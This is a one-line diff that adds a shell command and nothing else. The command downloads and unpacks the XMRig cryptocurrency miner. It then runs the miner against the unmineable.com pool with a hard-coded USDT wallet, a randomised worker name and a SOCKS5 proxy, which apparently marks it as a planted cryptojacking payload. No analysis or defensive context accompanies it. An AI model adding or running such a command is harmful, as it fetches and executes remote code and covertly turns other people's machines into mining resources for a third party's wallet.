@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u USDT:TLPbsRkFNUAutW7V5XeiC4jt9RDJd8xwVP.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x -t 1 socks5://184.178.172.11:4145
